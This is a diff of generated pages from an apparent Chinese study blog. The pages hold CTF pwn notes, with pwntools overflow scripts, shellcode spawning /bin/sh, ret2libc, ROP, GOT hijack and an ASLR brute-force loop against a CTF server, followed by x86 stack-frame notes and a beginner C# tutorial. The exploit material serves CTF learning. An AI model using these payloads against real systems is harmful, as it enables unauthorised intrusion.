 <p>第一想法是用这里直接TM的偏移到目标函数，试一试：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, os =<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">io=remote(<span class="string">&quot;&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;555&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">payload=<span class="number">0x68</span>*<span class="string">&quot;a&quot;</span>+p32(-<span class="number">238</span>)+p32(<span class="number">0x80486CC</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interative()</span><br><span class="line"><span class="comment"># 骗分过样例，暴力出奇迹</span></span><br></pre></td></tr></table></figure>
-
 <p>但是攻防世界网站又炸了，我是它爹</p>
 
       
@@ -823,7 +825,7 @@ transform.forward 代表某物体的x，y，z轴的指向 这3个都是标准向
           <i class="far fa-calendar-check"></i>
         </span>
         <span class="post-meta-item-text">Edited on</span>
-        <time title="Modified: 2021-04-29 16:00:43" itemprop="dateModified" datetime="2021-04-29T16:00:43+08:00">2021-04-29</time>
+        <time title="Modified: 2021-09-05 10:18:16" itemprop="dateModified" datetime="2021-09-05T10:18:16+08:00">2021-09-05</time>
       </span>
 
   
@@ -836,28 +838,39 @@ transform.forward 代表某物体的x，y，z轴的指向 这3个都是标准向
     
     
     <div class="post-body" itemprop="articleBody">
-          <h1 id="泄露数据"><a href="#泄露数据" class="headerlink" title="泄露数据"></a>泄露数据</h1><h3 id="printf函数格式化字符串漏洞"><a href="#printf函数格式化字符串漏洞" class="headerlink" title="printf函数格式化字符串漏洞"></a>printf函数格式化字符串漏洞</h3><h1 id="修改数据"><a href="#修改数据" class="headerlink" title="修改数据"></a>修改数据</h1><h3 id="数据偏移"><a href="#数据偏移" class="headerlink" title="数据偏移"></a>数据偏移</h3><p>给定读入数据范围过大，以至于可覆盖掉其它数据<br>strcpy函数的粘贴过程也可以理解为读入</p>
-<h3 id="printf函数格式化字符串漏洞-1"><a href="#printf函数格式化字符串漏洞-1" class="headerlink" title="printf函数格式化字符串漏洞"></a>printf函数格式化字符串漏洞</h3><p>向栈内某处出写入数据</p>
-<h3 id="整型变量溢出"><a href="#整型变量溢出" class="headerlink" title="整型变量溢出"></a>整型变量溢出</h3><h1 id="伪随机"><a href="#伪随机" class="headerlink" title="伪随机"></a>伪随机</h1><p>伪随机函数，只要给出同一个种子，在同一个环境下（windows或Linux），会产生相同的结果</p>
-<h1 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h1><h3 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h3><p>修改返回地址，让其指向溢出数据中的一段指令（shellcode）</p>
-<p>shellcode 可以用汇编语言来写再转成对应的机器码，也可以上网搜索直接复制粘贴，这里简单介绍，具体在pwn工具的博客里<br>（以下为获取pwntools内置集成）<br>（1）先设置目标机的参数<br>context(os=’linux’, arch=’amd64’, log_level=’debug’)<br>os设置系统为linux系统，arch设置架构为amd64，32位下是i386<br>log_level用于debug<br>（2）获取shellcode<br>获得执行system(“/bin/sh”)汇编代码所对应的机器码<br>asm(shellcraft.sh())<br>例子</p>
+          <h1 id="泄露数据">泄露数据</h1>
+<h3 id="printf函数格式化字符串漏洞">printf函数格式化字符串漏洞</h3>
+<h1 id="修改数据">修改数据</h1>
+<h3 id="数据偏移">数据偏移</h3>
+<p>给定读入数据范围过大，以至于可覆盖掉其它数据 strcpy函数的粘贴过程也可以理解为读入</p>
+<h3 id="printf函数格式化字符串漏洞-1">printf函数格式化字符串漏洞</h3>
+<p>向栈内某处出写入数据</p>
+<h3 id="整型变量溢出">整型变量溢出</h3>
+<h1 id="伪随机">伪随机</h1>
+<p>伪随机函数，只要给出同一个种子，在同一个环境下（windows或Linux），会产生相同的结果</p>
+<h1 id="栈溢出">栈溢出</h1>
+<h3 id="shellcode">shellcode</h3>
+<p>修改返回地址，让其指向溢出数据中的一段指令（shellcode）</p>
+<p>shellcode 可以用汇编语言来写再转成对应的机器码，也可以上网搜索直接复制粘贴，这里简单介绍，具体在pwn工具的博客里 （以下为获取pwntools内置集成） （1）先设置目标机的参数 context(os=’linux’, arch=’amd64’, log_level=’debug’) os设置系统为linux系统，arch设置架构为amd64，32位下是i386 log_level用于debug （2）获取shellcode 获得执行system(“/bin/sh”)汇编代码所对应的机器码 asm(shellcraft.sh()) 例子</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, arch = <span class="string">&#x27;i386&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br></pre></td></tr></table></figure>
-
 <p>获取shellcode的起始地址：</p>
-<p>覆盖完ebp后，填充若干长度的 “\x90”，在写入shellcode。”\x90”这个机器码对应的指令是 NOP (No Operation)，也就是告诉 CPU  什么也不做，然后跳到下一条指令。有了这一段 NOP 的填充，只要返回地址能够命中这一段中的任意位置，都可以无副作用地跳转到 shellcode  的起始处，所以这种方法被称为 NOP Sled（中文含义是“滑雪橇”）。</p>
+<p>覆盖完ebp后，填充若干长度的 “”，在写入shellcode。""这个机器码对应的指令是 NOP (No Operation)，也就是告诉 CPU 什么也不做，然后跳到下一条指令。有了这一段 NOP 的填充，只要返回地址能够命中这一段中的任意位置，都可以无副作用地跳转到 shellcode 的起始处，所以这种方法被称为 NOP Sled（中文含义是“滑雪橇”）。</p>
 <p>ps：当函数调用的栈中的数据没有可执行权限，此攻击手法彻底无效</p>
-<h3 id="return2libc"><a href="#return2libc" class="headerlink" title="return2libc"></a>return2libc</h3><p>修改返回地址，让其指向内存中已有的某个函数（return2libc）</p>
-<p>动态库包含了一些系统级的函数（例如 system()  等），鉴于要执行的函数可能需要参数，比如调用 system() 函数打开 shell  的完整形式为 system(“/bin/sh”) ，所以溢出数据也要包括必要的参数。</p>
-<p>下面介绍执行 system(“/bin/sh”)  </p>
-<p>payload:  padding1 + address of system() + padding2 + address of “/bin/sh”</p>
+<h3 id="return2libc">return2libc</h3>
+<p>修改返回地址，让其指向内存中已有的某个函数（return2libc）</p>
+<p>动态库包含了一些系统级的函数（例如 system() 等），鉴于要执行的函数可能需要参数，比如调用 system() 函数打开 shell 的完整形式为 system(“/bin/sh”) ，所以溢出数据也要包括必要的参数。</p>
+<p>下面介绍执行 system(“/bin/sh”)</p>
+<p>payload: padding1 + address of system() + padding2 + address of “/bin/sh”</p>
 <p>“/bin/sh” 的地址在哪里？</p>
 <p>可以在动态库里搜索这个字符串，如果在动态库里找不到，可以将这个字符串加到环境变量里，再通过 getenv() 等函数来确定地址。</p>
-<h3 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h3><p>修改返回地址，让其指向内存中已有的一段指令（ROP）</p>
-<h3 id="hijack-GOT"><a href="#hijack-GOT" class="headerlink" title="hijack GOT"></a>hijack GOT</h3><p>修改某个被调用函数的地址，让其指向另一个函数（hijack GOT）</p>
-<h1 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h1><p>一旦程序开启了ASLR，除了低3位的地址以外其余全是扯淡，低位地址靠查，高位地址试出来</p>
+<h3 id="rop">ROP</h3>
+<p>修改返回地址，让其指向内存中已有的一段指令（ROP）</p>
+<h3 id="hijack-got">hijack GOT</h3>
+<p>修改某个被调用函数的地址，让其指向另一个函数（hijack GOT）</p>
+<h1 id="爆破">爆破</h1>
+<p>一旦程序开启了ASLR，除了低3位的地址以外其余全是扯淡，低位地址靠查，高位地址试出来</p>
 <p>一个例子</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">	io = remote(<span class="string">&quot;node2.hackingfor.fun&quot;</span>,<span class="number">36058</span>)</span><br><span class="line">	io.send(<span class="string">&quot;a&quot;</span>*<span class="number">16</span>+p16(<span class="number">0x64e1</span>))</span><br><span class="line">	res = io.recvall()</span><br><span class="line">	<span class="keyword">if</span> <span class="string">&quot;&#123;&quot;</span> <span class="keyword">in</span> res: <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
-
 
       
     </div>
@@ -915,7 +928,7 @@ transform.forward 代表某物体的x，y，z轴的指向 这3个都是标准向
           <i class="far fa-calendar-check"></i>
         </span>
         <span class="post-meta-item-text">Edited on</span>
-        <time title="Modified: 2021-04-17 23:35:17" itemprop="dateModified" datetime="2021-04-17T23:35:17+08:00">2021-04-17</time>
+        <time title="Modified: 2021-09-05 10:18:03" itemprop="dateModified" datetime="2021-09-05T10:18:03+08:00">2021-09-05</time>
       </span>
 
   
@@ -928,21 +941,16 @@ transform.forward 代表某物体的x，y，z轴的指向 这3个都是标准向
     
     
     <div class="post-body" itemprop="articleBody">
-          <p><strong>代码</strong>生成<strong>可执行文件</strong><br><strong>可执行文件</strong>运行加载到<strong>内存</strong><br>其中<strong>机器指令</strong>位于<strong>代码段</strong></p>
+          <p><strong>代码</strong>生成<strong>可执行文件</strong> <strong>可执行文件</strong>运行加载到<strong>内存</strong> 其中<strong>机器指令</strong>位于<strong>代码段</strong></p>
 <img src="/2021/04/04/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8-%E6%A0%88%E5%B8%A7/1.jpg" class>
-
 <p>栈有高地址向低地址生成</p>
 <p>函数调用时，用栈来存放局部变量、参数、返回地址等。</p>
-<p>ebp指向栈底部（在高地址）（该寄存器存放的是栈地址）（可以用来索引确定函数参数或局部变量的位置）<br>esp指向栈顶（在低地址）（该寄存器存放的是栈地址）<br>eip指向下一条需要指向的指令（在代码段）（该寄存器存放的是代码段的地址）</p>
-<p>call指令之前：<br>首先将被调用函数的参数按照逆序依次压入栈内。如果被调用函数不需要参数，则没有这一步骤。</p>
-<p>call指令只做两件事：<br>1.打入返回地址 （push eip）<br>2.跳转（eip=%%%%）</p>
-<p>函数开头：<br>1.分配栈帧大小（esp=esp-n）（之后用栈就往[esp+m]里写东西）<br>2.保存母函数的栈基地址于栈中（[esp+m1]=ebp）（母函数也有其栈帧）<br>3.确定子函数的栈基地址，即当前栈最新空着的地方（ebp=esp+m2）<br>函数中间：<br>执行该子函数在代码段的其它指令，其中栈会刚好用到esp+n处<br>函数结尾：<br>1.恢复ebp存储母函数的栈基地址（ebp=[esp+m1]）<br>2.释放该子栈帧的空间（esp=esp+n）</p>
-<p>ret指令只做两件事：<br>1.弹出返回地址 （eip=pop）<br>2.跳转</p>
-<p>这是函数嵌套调用时栈的模样：</p>
-<img src="/2021/04/04/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8-%E6%A0%88%E5%B8%A7/1.png" class>
-
-
-
+<p>ebp指向栈底部（在高地址）（该寄存器存放的是栈地址）（可以用来索引确定函数参数或局部变量的位置） esp指向栈顶（在低地址）（该寄存器存放的是栈地址） eip指向下一条需要指向的指令（在代码段）（该寄存器存放的是代码段的地址）</p>
+<p>call指令之前： 首先将被调用函数的参数按照逆序依次压入栈内。如果被调用函数不需要参数，则没有这一步骤。</p>
+<p>call指令只做两件事： 1.打入返回地址 （push eip） 2.跳转（eip=%%%%）</p>
+<p>函数开头： 1.分配栈帧大小（esp=esp-n）（之后用栈就往[esp+m]里写东西） 2.保存母函数的栈基地址于栈中（[esp+m1]=ebp）（母函数也有其栈帧） 3.确定子函数的栈基地址，即当前栈最新空着的地方（ebp=esp+m2） 函数中间： 执行该子函数在代码段的其它指令，其中栈会刚好用到esp+n处 函数结尾： 1.恢复ebp存储母函数的栈基地址（ebp=[esp+m1]） 2.释放该子栈帧的空间（esp=esp+n）</p>
+<p>ret指令只做两件事： 1.弹出返回地址 （eip=pop） 2.跳转</p>
+<p>这是函数嵌套调用时栈的模样： <img src="/2021/04/04/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8-%E6%A0%88%E5%B8%A7/1.png" class></p>
 <p>PS：CGfsb遗留的问题至此解决</p>
 
       
@@ -1001,7 +1009,7 @@ transform.forward 代表某物体的x，y，z轴的指向 这3个都是标准向
           <i class="far fa-calendar-check"></i>
         </span>
         <span class="post-meta-item-text">Edited on</span>
-        <time title="Modified: 2021-09-04 21:53:09" itemprop="dateModified" datetime="2021-09-04T21:53:09+08:00">2021-09-04</time>
+        <time title="Modified: 2021-09-07 08:48:18" itemprop="dateModified" datetime="2021-09-07T08:48:18+08:00">2021-09-07</time>
       </span>
 
   
@@ -1015,114 +1023,117 @@ transform.forward 代表某物体的x，y，z轴的指向 这3个都是标准向
     
     <div class="post-body" itemprop="articleBody">
           <p>写在前面：没有提到的东西跟c++差不多</p>
-<h1 id="第一课"><a href="#第一课" class="headerlink" title="第一课"></a>第一课</h1><p>一个 C# 程序一般结果：<br>using System<br>命名空间声明（namespace betql）<br>    class<br>        class属性<br>        class方法<br>    class<br>        class属性<br>        class方法<br>            语句（Statements）&amp; 表达式（Expressions）<br>        Main方法<br>            语句（Statements）&amp; 表达式（Expressions）</p>
+<h1 id="第一课">第一课</h1>
+<p>一个 C# 程序一般结果： using System 命名空间声明（namespace betql） class class属性 class方法 class class属性 class方法 语句（Statements）&amp; 表达式（Expressions） Main方法 语句（Statements）&amp; 表达式（Expressions）</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">using System;</span><br><span class="line">namespace HelloWorldApplication</span><br><span class="line">&#123;</span><br><span class="line">   class HelloWorld</span><br><span class="line">   &#123;</span><br><span class="line">      static void Main(string[] args)</span><br><span class="line">      &#123;</span><br><span class="line">         /* 我的第一个 C# 程序*/</span><br><span class="line">         Console.WriteLine(&quot;Hello World&quot;);</span><br><span class="line">         Console.ReadKey();</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line">//目前来说，这里基本可以当作格式</span><br></pre></td></tr></table></figure>
-
-<p><strong>类</strong>一般包含多个<strong>方法</strong>。<br><strong>方法</strong>定义了<strong>类</strong>的行为。<br><strong>Main</strong> 方法，是所有 C# 程序的 <strong>入口点</strong>。<strong>Main</strong>  方法说明当执行时 <strong>类</strong>将做什么动作。<br><strong>Console.ReadKey();</strong> 是针对 VS.NET 用户的。这使得程序会等待一个按键的动作，防止程序从 Visual Studio .NET 启动时屏幕会快速运行并关闭。<br><strong>WriteLine</strong> 是一个定义在 <strong>System</strong> 命名空间中的 <strong>Console</strong> 类的一个方法。</p>
-<p>注：<br>C# 是大小写敏感的。<br>所有的语句和表达式必须以分号（;）结尾。<br>程序的执行从 Main 方法开始。</p>
-<h1 id="第二课"><a href="#第二课" class="headerlink" title="第二课"></a>第二课</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">using System;</span><br><span class="line">namespace RectangleApplication</span><br><span class="line">&#123;</span><br><span class="line">    class Rectangle</span><br><span class="line">    &#123;</span><br><span class="line">        // 成员变量</span><br><span class="line">        double length;</span><br><span class="line">        double width;</span><br><span class="line">        public void Acceptdetails()</span><br><span class="line">        &#123;</span><br><span class="line">            length = 4.5;</span><br><span class="line">            width = 3.5;</span><br><span class="line">        &#125;</span><br><span class="line">        public double GetArea()</span><br><span class="line">        &#123;</span><br><span class="line">            return length * width;</span><br><span class="line">        &#125;</span><br><span class="line">        public void Display()</span><br><span class="line">        &#123;</span><br><span class="line">            Console.WriteLine(&quot;Length: &#123;0&#125;; Width: &#123;1&#125;; Area: &#123;2&#125;&quot;, length, width, GetArea());</span><br><span class="line">            //是的，是顺序和格式</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    class ExecuteRectangle</span><br><span class="line">    &#123;</span><br><span class="line">        static void Main(string[] args)</span><br><span class="line">        &#123;</span><br><span class="line">            Rectangle r = new Rectangle();//类的实例化：通过已有的类（class）创建出该类的一个对象（object）</span><br><span class="line">            r.Display();//输出0</span><br><span class="line">            r.Acceptdetails();</span><br><span class="line">            r.Display();</span><br><span class="line">            Console.ReadLine();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>注：<br>当一个方法有超过两件事情，就分开来写。<br>面向对象&amp;面相对向的原理就是善用Class做分类。<br>不要将所有事情都写在一起，到时候有问题要全部重写。<br>也有可能别人在看代码需要很多时间去理解。<br>因此善用分类，让大家都能轻易读懂。<br>未来Class一定会建立很多，可能一个Class就只有2-3行。<br>但这就是单一职责，高内聚低耦合，让未来debug不会这么痛苦。<br>写不难，逻辑分清楚，让大家都能懂，这才难。</p>
-<h1 id="第三课-数据类型"><a href="#第三课-数据类型" class="headerlink" title="第三课 数据类型"></a>第三课 数据类型</h1><h2 id="值类型"><a href="#值类型" class="headerlink" title="值类型"></a>值类型</h2><p>对于一个变量有专属的一个内存地址</p>
-<h2 id="引用类型"><a href="#引用类型" class="headerlink" title="引用类型"></a>引用类型</h2><p>对于莫个地址有不同的变量指向它<br>比如定义引用类型   a=10，这时候在内存中保存的是 10，当把 a 赋给 b 的时候，他们两个应用的是同一个内存空间，b 的值会保存为 a 的值，当把  b 改为 20 时，应为 a 和 b 引用的是同一个所以 a 也变成 20 了</p>
-<p>装箱：值类型转换为对象类型<br>拆箱：之前由值类型转换而来的对象类型再转回值类型</p>
+<p><strong>类</strong>一般包含多个<strong>方法</strong>。 <strong>方法</strong>定义了<strong>类</strong>的行为。 <strong>Main</strong> 方法，是所有 C# 程序的 <strong>入口点</strong>。<strong>Main</strong> 方法说明当执行时 <strong>类</strong>将做什么动作。 <strong>Console.ReadKey();</strong> 是针对 VS.NET 用户的。这使得程序会等待一个按键的动作，防止程序从 Visual Studio .NET 启动时屏幕会快速运行并关闭。 <strong>WriteLine</strong> 是一个定义在 <strong>System</strong> 命名空间中的 <strong>Console</strong> 类的一个方法。</p>
+<p>注： C# 是大小写敏感的。 所有的语句和表达式必须以分号（;）结尾。 程序的执行从 Main 方法开始。</p>
+<h1 id="第二课">第二课</h1>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">using System;</span><br><span class="line">namespace RectangleApplication</span><br><span class="line">&#123;</span><br><span class="line">    class Rectangle</span><br><span class="line">    &#123;</span><br><span class="line">        // 成员变量</span><br><span class="line">        double length;</span><br><span class="line">        double width;</span><br><span class="line">        public void Acceptdetails()</span><br><span class="line">        &#123;</span><br><span class="line">            length = 4.5;</span><br><span class="line">            width = 3.5;</span><br><span class="line">        &#125;</span><br><span class="line">        public double GetArea()</span><br><span class="line">        &#123;</span><br><span class="line">            return length * width;</span><br><span class="line">        &#125;</span><br><span class="line">        public void Display()</span><br><span class="line">        &#123;</span><br><span class="line">            Console.WriteLine(&quot;Length: &#123;0&#125;; Width: &#123;1&#125;; Area: &#123;2&#125;&quot;, length, width, GetArea());</span><br><span class="line">            //是的，是顺序和格式</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    class ExecuteRectangle</span><br><span class="line">    &#123;</span><br><span class="line">        static void Main(string[] args)</span><br><span class="line">        &#123;</span><br><span class="line">            Rectangle r = new Rectangle();//类的实例化：通过已有的类（class）创建出该类的一个对象（object）</span><br><span class="line">            r.Display();//输出0</span><br><span class="line">            r.Acceptdetails();</span><br><span class="line">            r.Display();</span><br><span class="line">            Console.ReadLine();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>注： 当一个方法有超过两件事情，就分开来写。 面向对象&amp;面相对向的原理就是善用Class做分类。 不要将所有事情都写在一起，到时候有问题要全部重写。 也有可能别人在看代码需要很多时间去理解。 因此善用分类，让大家都能轻易读懂。 未来Class一定会建立很多，可能一个Class就只有2-3行。 但这就是单一职责，高内聚低耦合，让未来debug不会这么痛苦。 写不难，逻辑分清楚，让大家都能懂，这才难。</p>
+<h1 id="第三课-数据类型">第三课 数据类型</h1>
+<h2 id="值类型">值类型</h2>
+<p>对于一个变量有专属的一个内存地址</p>
+<h2 id="引用类型">引用类型</h2>
+<p>对于莫个地址有不同的变量指向它 比如定义引用类型 a=10，这时候在内存中保存的是 10，当把 a 赋给 b 的时候，他们两个应用的是同一个内存空间，b 的值会保存为 a 的值，当把 b 改为 20 时，应为 a 和 b 引用的是同一个所以 a 也变成 20 了</p>
+<p>装箱：值类型转换为对象类型 拆箱：之前由值类型转换而来的对象类型再转回值类型</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">int val = 8;</span><br><span class="line">object obj = val;//先装箱</span><br><span class="line">int nval = （int）obj;//再拆箱</span><br></pre></td></tr></table></figure>
-
 <p><strong>字符串（string）类型</strong> 允许您给变量分配任何字符串值。</p>
-<p>字符串（string）类型的值可以通过两种形式进行分配：引号和 @引号。</p>
-<p>C# string 字符串的前面可以加 @（称作”逐字字符串”）将转义字符（\）当作普通字符对待，比如：</p>
+<p>字符串（string）类型的值可以通过两种形式进行分配：引号和 <span class="citation" data-cites="引号">@引号</span>。</p>
+<p>C# string 字符串的前面可以加 @（称作"逐字字符串"）将转义字符（）当作普通字符对待，比如：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">string str = @&quot;C:\Windows&quot;;</span><br><span class="line">//等价于</span><br><span class="line">string str = &quot;C:\\Windows&quot;;</span><br></pre></td></tr></table></figure>
-
 <p>@ 字符串中可以任意换行，<strong>换行符</strong>及<strong>缩进空格</strong>都计算在字符串长度之内。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">string str = @&quot;&lt;script type=&quot;&quot;text/javascript&quot;&quot;&gt;</span><br><span class="line">    &lt;!--</span><br><span class="line">    --&gt;</span><br><span class="line">&lt;/script&gt;&quot;;</span><br></pre></td></tr></table></figure>
-
-
-
-<h1 id="第四课-类型转换"><a href="#第四课-类型转换" class="headerlink" title="第四课 类型转换"></a>第四课 类型转换</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">namespace TypeConversionApplication</span><br><span class="line">&#123;</span><br><span class="line">    class StringConversion</span><br><span class="line">    &#123;</span><br><span class="line">        static void Main(string[] args)</span><br><span class="line">        &#123;</span><br><span class="line">            int i = 75;</span><br><span class="line">            float f = 53.005f;</span><br><span class="line">            double d = 2345.7652;</span><br><span class="line">            bool b = true;</span><br><span class="line"></span><br><span class="line">            Console.WriteLine(i.ToString());//C#提供的内置的类型转换方法</span><br><span class="line">            Console.WriteLine(f.ToString());</span><br><span class="line">            Console.WriteLine(d.ToString());</span><br><span class="line">            Console.WriteLine(b.ToString());</span><br><span class="line">            </span><br><span class="line">            int j = (int)f;//强制/显性进制转化，可能导致数据丢失</span><br><span class="line">            long k= i; //隐性进制转化，不会导致数据丢失</span><br><span class="line">            Console.WriteLine(j);</span><br><span class="line">            Console.WriteLine(k);</span><br><span class="line">            Console.ReadKey();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">/*</span><br><span class="line">75</span><br><span class="line">53.005</span><br><span class="line">2345.7652</span><br><span class="line">True</span><br><span class="line">53</span><br><span class="line">75</span><br><span class="line">*/</span><br></pre></td></tr></table></figure>
-
-<h2 id="C-类型转换方法"><a href="#C-类型转换方法" class="headerlink" title="C# 类型转换方法"></a>C# 类型转换方法</h2><table>
+<h1 id="第四课-类型转换">第四课 类型转换</h1>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">namespace TypeConversionApplication</span><br><span class="line">&#123;</span><br><span class="line">    class StringConversion</span><br><span class="line">    &#123;</span><br><span class="line">        static void Main(string[] args)</span><br><span class="line">        &#123;</span><br><span class="line">            int i = 75;</span><br><span class="line">            float f = 53.005f;</span><br><span class="line">            double d = 2345.7652;</span><br><span class="line">            bool b = true;</span><br><span class="line"></span><br><span class="line">            Console.WriteLine(i.ToString());//C#提供的内置的类型转换方法</span><br><span class="line">            Console.WriteLine(f.ToString());</span><br><span class="line">            Console.WriteLine(d.ToString());</span><br><span class="line">            Console.WriteLine(b.ToString());</span><br><span class="line">            </span><br><span class="line">            int j = (int)f;//强制/显性进制转化，可能导致数据丢失</span><br><span class="line">            long k= i; //隐性进制转化，不会导致数据丢失</span><br><span class="line">            Console.WriteLine(j);</span><br><span class="line">            Console.WriteLine(k);</span><br><span class="line">            Console.ReadKey();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">/*</span><br><span class="line">75</span><br><span class="line">53.005</span><br><span class="line">2345.7652</span><br><span class="line">True</span><br><span class="line">53</span><br><span class="line">75</span><br><span class="line">*/</span><br></pre></td></tr></table></figure>
+<h2 id="c-类型转换方法">C# 类型转换方法</h2>
+<table>
 <thead>
-<tr>
+<tr class="header">
 <th>序号</th>
 <th>方法 &amp; 描述</th>
 </tr>
 </thead>
-<tbody><tr>
+<tbody>
+<tr class="odd">
 <td>1</td>
 <td><strong>ToBoolean</strong> 如果可能的话，把类型转换为布尔型。</td>
 </tr>
-<tr>
+<tr class="even">
 <td>2</td>
 <td><strong>ToByte</strong> 把类型转换为字节类型。</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>3</td>
